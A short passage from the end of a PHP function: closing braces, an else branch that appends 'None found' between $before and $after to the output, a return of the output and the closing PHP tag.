		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>
